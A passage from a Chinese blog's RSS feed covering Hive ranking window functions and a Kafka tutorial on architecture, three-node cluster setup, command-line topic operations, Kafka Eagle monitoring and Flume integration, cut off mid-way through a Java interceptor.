排序相同时会重复，总数不会变</strong></p><p><strong>DENSE_RANK() 排序相同时会重复，总数会减少</strong></p><p><strong>ROW_NUMBER() 会根据顺序计算</strong></p><p>2）数据准备</p><table><thead><tr><th>name</th><th>subject</th><th>score</th></tr></thead><tbody><tr><td>孙悟空</td><td>语文</td><td>87</td></tr><tr><td>孙悟空</td><td>数学</td><td>95</td></tr><tr><td>孙悟空</td><td>英语</td><td>68</td></tr><tr><td>大海</td><td>语文</td><td>94</td></tr><tr><td>大海</td><td>数学</td><td>56</td></tr><tr><td>大海</td><td>英语</td><td>84</td></tr><tr><td>宋宋</td><td>语文</td><td>64</td></tr><tr><td>宋宋</td><td>数学</td><td>86</td></tr><tr><td>宋宋</td><td>英语</td><td>84</td></tr><tr><td>婷婷</td><td>语文</td><td>65</td></tr><tr><td>婷婷</td><td>数学</td><td>85</td></tr><tr><td>婷婷</td><td>英语</td><td>78</td></tr></tbody></table><p>3）需求</p><p>计算每门学科成绩排名。</p><p>4）创建本地score.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi score.txt</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table score(name string,subject string, score int) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &#39;/opt/module/hive/datas/score.txt&#39; into table score;</code></pre><p>6）按需求查询数据</p><pre><code>select name,subject,score,rank() over(partition by subject order by score desc) rp,dense_rank() over(partition by subject order by score desc) drp,row_number() over(partition by subject order by score desc) rmpfrom score;</code></pre><p>查询结果如下面所示：</p><pre><code>name  subject score  rp   drp   rmp孙悟空 数学  95   1    1    1宋宋  数学  86   2    2    2婷婷  数学  85   3    3    3大海  数学  56   4    4    4宋宋  英语  84   1    1    1大海  英语  84   1    1    2婷婷  英语  78   3    2    3孙悟空 英语  68   4    3    4大海  语文  94   1    1    1孙悟空 语文  87   2    2    2婷婷  语文  65   3    3    3宋宋  语文  64   4    4    4</code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（一） kafka搭建</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/</guid>
      <pubDate>Sat, 14 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Kafka概述"><a href="#1-Kafka概述" class="headerlink" title="1 Kafka概述"></a>1 Kafka概述</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p>Kafka是一个分布式的基于发布/订阅模式的消息队列（Message Queue），主要应用于大数据实时处理领域。</p><h2 id="1-2-消息队列"><a href="#1-2-消息队列" class="headerlink" title="1.2 消息队列"></a>1.2 消息队列</h2><h3 id="1-2-1-传统消息队列的应用场景"><a href="#1-2-1-传统消息队列的应用场景" class="headerlink" title="1.2.1 传统消息队列的应用场景"></a>1.2.1 传统消息队列的应用场景</h3><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153923628.png" alt="1637153923628">            </p><p>使用消息队列的好处</p><p>1）解耦</p><p>允许你独立的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。</p><p>2）可恢复性</p><p>系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理。</p><p>3）缓冲</p><p>有助于控制和优化数据流经过系统的速度，解决生产消息和消费消息的处理速度不一致的情况。</p><p>4）灵活性 &amp; 峰值处理能力</p><p>在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量并不常见。如果为以能处理这类峰值访问为标准来投入资源随时待命无疑是巨大的浪费。使用消息队列能够使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃。</p><p>5）异步通信</p><p>很多时候，用户不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时候再去处理它们。</p><h3 id="1-2-2-消息队列的两种模式"><a href="#1-2-2-消息队列的两种模式" class="headerlink" title="1.2.2 消息队列的两种模式"></a>1.2.2 消息队列的两种模式</h3><p>（1）点对点模式（一对一，消费者主动拉取数据，消息收到后消息清除）</p><p>消息生产者生产消息发送到Queue中，然后消息消费者从Queue中<strong>取出</strong>并且消费消息。（<strong>这里注意是消费者主动拉取的</strong>）</p><p>消息被消费以后，queue中不再有存储，所以消息消费者不可能消费到已经被消费的消息。Queue支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费。  </p><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153951339.png" alt="1637153951339"></p><p>（2）发布/订阅模式（一对多，消费者消费数据之后不会清除消息）</p><p>消息生产者（发布）将消息发布到topic中，同时有多个消息消费者（订阅）<strong>消费</strong>该消息。和点对点方式不同，发布到topic的消息会被所有订阅者消费。（<strong>这里注意数据也是消费者拉取的，因为消费者会一直轮询topic是否有消息</strong>）</p><p><img src="/2020/11/15/bigdata-kafka1-setup/1637153963262.png" alt="1637153963262"></p><h2 id="1-3-Kafka基础架构"><a href="#1-3-Kafka基础架构" class="headerlink" title="1.3 Kafka基础架构"></a>1.3 Kafka基础架构</h2><p>  <img src="/2020/11/15/bigdata-kafka1-setup/1637154054233.png" alt="1637154054233"></p><p>1）Producer ：消息生产者，就是向kafka broker发消息的客户端；</p><p>2）Consumer ：消息消费者，向kafka broker取消息的客户端；</p><p>3）Consumer Group （CG）：消费者组，由多个consumer组成。消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费；消费者组之间互不影响。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。</p><p>4）Broker ：一台kafka服务器就是一个broker。一个集群由多个broker组成。一个broker可以容纳多个topic。</p><p>5）Topic ：可以理解为一个队列，生产者和消费者面向的都是一个topic；</p><p>6）Partition：为了实现扩展性，一个非常大的topic可以分布到多个broker（即服务器）上，一个topic可以分为多个partition，每个partition是一个有序的队列；</p><p>7）Replica：副本，为保证集群中的某个节点发生故障时，该节点上的partition数据不丢失，且kafka仍然能够继续工作，kafka提供了副本机制，一个topic的每个分区都有若干个副本，一个leader和若干个follower。</p><p>8）leader：每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是leader。</p><p>9）follower：每个分区多个副本中的“从”，实时从leader中同步数据，保持和leader数据的同步。leader发生故障时，某个follower会成为新的leader。</p><p>10）kafka集群依赖于zookeeper管理。</p><h1 id="2-Kafka安装部署"><a href="#2-Kafka安装部署" class="headerlink" title="2 Kafka安装部署"></a>2 Kafka安装部署</h1><h2 id="2-1-集群规划"><a href="#2-1-集群规划" class="headerlink" title="2.1 集群规划"></a>2.1 集群规划</h2><table><thead><tr><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>zk</td><td>zk</td><td>zk</td></tr><tr><td>kafka</td><td>kafka</td><td>kafka</td></tr></tbody></table><h2 id="2-2-Kafka-下载"><a href="#2-2-Kafka-下载" class="headerlink" title="2.2 Kafka 下载"></a>2.2 Kafka 下载</h2><p><a href="http://kafka.apache.org/downloads.html">http://kafka.apache.org/downloads.html</a></p><h2 id="2-3-集群部署"><a href="#2-3-集群部署" class="headerlink" title="2.3 集群部署"></a>2.3 集群部署</h2><p>1）解压安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka_2.11-2.4.1.tgz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）修改解压后的文件名称</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> kafka_2.11-2.4.1.tgz kafka<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）在/opt/module/kafka目录下创建logs文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）修改配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ <span class="token function">cd</span> config/<span class="token punctuation">[</span>molly@hadoop102 config<span class="token punctuation">]</span>$ <span class="token function">vi</span> server.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输入以下内容：</p><pre class="line-numbers language-sh"><code class="language-sh">#broker的全局唯一编号，不能重复broker.id=0#删除topic功能使能,当前版本此配置默认为true，已从配置文件移除delete.topic.enable=true#处理网络请求的线程数量num.network.threads=3#用来处理磁盘IO的线程数量num.io.threads=8#发送套接字的缓冲区大小socket.send.buffer.bytes=102400#接收套接字的缓冲区大小socket.receive.buffer.bytes=102400#请求套接字的缓冲区大小socket.request.max.bytes=104857600#kafka运行日志存放的路径log.dirs=/opt/module/kafka/logs#topic在当前broker上的分区个数num.partitions=1#用来恢复和清理data下数据的线程数量num.recovery.threads.per.data.dir=1#segment文件保留的最长时间，超时将被删除log.retention.hours=168#配置连接Zookeeper集群地址zookeeper.connect=hadoop102:2181,hadoop103:2181,hadoop104:2181<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span class="token comment" spellcheck="true">#KAFKA_HOME</span><span class="token function">export</span> KAFKA_HOME<span class="token operator">=</span>/opt/module/kafka<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$KAFKA_HOME</span>/bin<span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 6）分发安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync kafka/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    注意：分发之后记得配置其他机器的环境变量</p><p>7）分别在hadoop103和hadoop104上修改配置文件/opt/module/kafka/config/server.properties中的broker.id=1、broker.id=2</p><p>​    注：broker.id不得重复</p><p>8）启动集群</p><p>​    先启动Zookeeper集群，然后启动kafaka</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102  kafka<span class="token punctuation">]</span>$ zk.sh start <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>依次在hadoop102、hadoop103、hadoop104节点上启动kafka</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon config/server.properties<span class="token punctuation">[</span>molly@hadoop103 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon  config/server.properties<span class="token punctuation">[</span>molly@hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon  config/server.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>9）关闭集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span class="token punctuation">[</span>molly@hadoop103 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span class="token punctuation">[</span>molly@hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>10）kafka群起脚本</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashif [ $# -lt 1 ]then   echo "Input Args Error....."  exitfifor i in hadoop102 hadoop103 hadoop104docase $1 instart)  echo "==================START $i KAFKA==================="  ssh $i /opt/module/kafka_2.11-2.4.1/bin/kafka-server-start.sh -daemon /opt/module/kafka_2.11-2.4.1/config/server.properties;;stop)  echo "==================STOP $i KAFKA==================="  ssh $i /opt/module/kafka_2.11-2.4.1/bin/kafka-server-stop.sh stop;;*) echo "Input Args Error....." exit;;  esacdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Kafka命令行操作"><a href="#3-Kafka命令行操作" class="headerlink" title="3 Kafka命令行操作"></a>3 Kafka命令行操作</h1><p>kafka提供了测试脚本kafka-topics.sh用来测试。</p><p>1）查看当前服务器中的所有topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）创建topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --create --replication-factor 3 --partitions 1 --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选项说明：</p><p>–topic 定义topic名<br>–replication-factor 定义副本数<br>–partitions 定义分区数</p><p>3）删除topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --delete --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）发送消息：生产消息– <strong>9092是kafka默认端口</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-producer.sh --broker-list hadoop102:9092 --topic first<span class="token operator">></span>hello world<span class="token operator">></span>molly molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>5）消费消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --topic first<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>–from-beginning：会把主题中现有的所有的数据都读取出来</strong>。</p><p>6）查看某个Topic的详情</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --describe –-topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）修改分区数 alter只能修改</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --alter –-topic first --partitions 6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-Kafka监控"><a href="#4-Kafka监控" class="headerlink" title="4 Kafka监控"></a>4 Kafka监控</h1><p>我们知道一个叫kafka manager的kafka管理工具，这个工具管理kafka确实很强大，但是没有安全认证，随便都可以创建，删除，修改topic，而且告警系统，流量波动做的不好。所以，在这里浪尖，再给大家推荐一款kafka 的告警监控管理工具，kafka-eagle。Kafka Eagle是一款开源的Kafka集群监控系统。能够实现broker级常见的JMX监控；能对consumer消费进度进行监控；能在页面上直接对多个集群进行管理；安装方式简单，二进制包解压即用；可以配置告警（钉钉、微信、email均可）。</p><p>kafka-eagle主要是有几个我们关注 但kafkamanager不存在的点，值得一提：</p><ul><li>流量，最长可以查看最近七天的流量波动图</li><li>lag size邮件告警</li><li>可以用kafkasql分析</li></ul><p>相关官方地址：</p><ul><li>源码： <a href="https://links.jianshu.com/go?to=https://github.com/smartloli/kafka-eagle/">https://github.com/smartloli/kafka-eagle/</a> </li><li>官网：<a href="https://links.jianshu.com/go?to=https://www.kafka-eagle.org/">https://www.kafka-eagle.org/</a> </li><li>下载： <a href="https://links.jianshu.com/go?to=http://download.kafka-eagle.org/">http://download.kafka-eagle.org/</a> </li><li>安装文档： <a href="https://links.jianshu.com/go?to=https://docs.kafka-eagle.org/2.env-and-install">https://docs.kafka-eagle.org/2.env-and-install</a></li></ul><p><strong>1）修改kafka启动命令</strong></p><p>修改kafka-server-start.sh命令中</p><pre class="line-numbers language-sh"><code class="language-sh">if [ "x$KAFKA_HEAP_OPTS" = "x" ]; then    export KAFKA_HEAP_OPTS="-Xmx1G -Xms1G"fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为</p><pre class="line-numbers language-sh"><code class="language-sh">if [ "x$KAFKA_HEAP_OPTS" = "x" ]; then    export KAFKA_HEAP_OPTS="-server -Xms2G -Xmx2G -XX:PermSize=128m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:ParallelGCThreads=8 -XX:ConcGCThreads=5 -XX:InitiatingHeapOccupancyPercent=70"    export JMX_PORT="9999"    #export KAFKA_HEAP_OPTS="-Xmx1G -Xms1G"fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：修改之后在启动Kafka之前要分发之其他节点</p><p> <strong>2）上传压缩包kafka-eagle-bin-1.4.5.tar.gz到集群/opt/software目录</strong></p><p><strong>3）解压到本地</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka-eagle-bin-1.4.5.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>4）进入刚才解压的目录</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka-eagle-bin-1.4.5<span class="token punctuation">]</span>$ ll总用量 82932-rw-rw-r--. 1 molly molly 84920710 8月 13 23:00 kafka-eagle-web-1.4.5-bin.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>5）将kafka-eagle-web-1.3.7-bin.tar.gz解压至/opt/module</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka-eagle-bin-1.4.5<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka-eagle-web-1.4.5-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>6）修改名称</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> kafka-eagle-web-1.4.5/ eagle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>7）给启动文件执行权限</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 eagle<span class="token punctuation">]</span>$ <span class="token function">cd</span> bin/<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ ll总用量 12-rw-r--r--. 1 molly molly 1848 8月 22 2017 ke.bat-rw-r--r--. 1 molly molly 7190 7月 30 20:12 ke.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> 777 ke.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>8）修改配置文件 conf/system-config.properties</strong></p><pre class="line-numbers language-sh"><code class="language-sh">####################################### multi zookeeper&kafka cluster list######################################kafka.eagle.zk.cluster.alias=cluster1cluster1.zk.list=hadoop102:2181,hadoop103:2181,hadoop104:2181####################################### kafka offset storage######################################cluster1.kafka.eagle.offset.storage=kafka####################################### enable kafka metrics######################################kafka.eagle.metrics.charts=truekafka.eagle.sql.fix.error=false####################################### kafka jdbc driver address######################################kafka.eagle.driver=com.mysql.jdbc.Driverkafka.eagle.url=jdbc:mysql://hadoop102:3306/ke?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNullkafka.eagle.username=rootkafka.eagle.password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>9）添加环境变量</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> KE_HOME<span class="token operator">=</span>/opt/module/eagle<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$KE_HOME</span>/bin<span class="token comment" spellcheck="true">#注意：source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>10）启动</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>atguigu@hadoop102 eagle<span class="token punctuation">]</span>$ bin/ke.sh start<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.******************************************************************** Kafka Eagle Service has started success.* Welcome, Now you can visit <span class="token string">'http://192.168.202.102:8048/ke'</span>* Account:admin ,Password:123456******************************************************************** <span class="token operator">&lt;</span>Usage<span class="token operator">></span> ke.sh <span class="token punctuation">[</span>start<span class="token operator">|</span>status<span class="token operator">|</span>stop<span class="token operator">|</span>restart<span class="token operator">|</span>stats<span class="token punctuation">]</span> <span class="token operator">&lt;</span>/Usage<span class="token operator">></span>* <span class="token operator">&lt;</span>Usage<span class="token operator">></span> https://www.kafka-eagle.org/ <span class="token operator">&lt;</span>/Usage<span class="token operator">></span>*******************************************************************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：启动之前需要先启动ZK以及KAFKA</strong></p><p> <strong>11）登录页面查看监控数据</strong></p><p><a href="http://192.168.202.102:8048/ke">http://192.168.202.102:8048/ke</a></p><p> <img src="/2020/11/15/bigdata-kafka1-setup/1637153214475.png" alt="1637153214475"></p><p>​                         </p><h1 id="5-Flume对接Kafka"><a href="#5-Flume对接Kafka" class="headerlink" title="5 Flume对接Kafka"></a>5 Flume对接Kafka</h1><h2 id="5-1-简单实现"><a href="#5-1-简单实现" class="headerlink" title="5.1 简单实现"></a>5.1 简单实现</h2><p><strong>1）配置flume</strong></p><pre class="line-numbers language-sh"><code class="language-sh"># definea1.sources = r1a1.sinks = k1a1.channels = c1# sourcea1.sources.r1.type = execa1.sources.r1.command = tail -F  /opt/module/data/flume.log# sinka1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sinks.k1.kafka.topic = firsta1.sinks.k1.kafka.flumeBatchSize = 20a1.sinks.k1.kafka.producer.acks = 1a1.sinks.k1.kafka.producer.linger.ms = 1# channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# binda1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2） 启动kafka消费者</p><p>3） 进入flume根目录下，启动flume</p><pre class="line-numbers language-bash"><code class="language-bash">$ bin/flume-ng agent -c conf/ -n a1 -f jobs/flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4） 向 /opt/module/data/flume.log里追加数据，查看kafka消费者消费情况</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token keyword">echo</span> hello <span class="token operator">>></span> /opt/module/data/flume.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2-数据分离"><a href="#5-2-数据分离" class="headerlink" title="5.2 数据分离"></a>5.2 数据分离</h2><p>0)需求 </p><p>将flume采集的数据按照不同的类型输入到不同的topic中</p><p>​     将日志数据中带有molly的，输入到Kafka的first主题中，</p><p>​     将日志数据中带有shangguigu的,输入到Kafka的second主题中，</p><p>​        其他的数据输入到Kafka的third主题中</p><p>1） 编写Flume的Interceptor</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>flumeInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>text<span class="token punctuation">.</span>html<span class="token punctuation">.</span>HTMLEditorKit<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlumeKafkaInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 如果包含"atguigu"的数据，发送到first主题     * 如果包含"sgg"的数据，发送到second主题     * 其他的数据发送到third主题     * @param event     * @return     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.获取event的header</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.获取event的body</span>        String body <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"topic"</span><span class="token punctuation">,</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"sgg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"topic"</span><span class="token punctuation">,</span><span class="token string">"second"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation 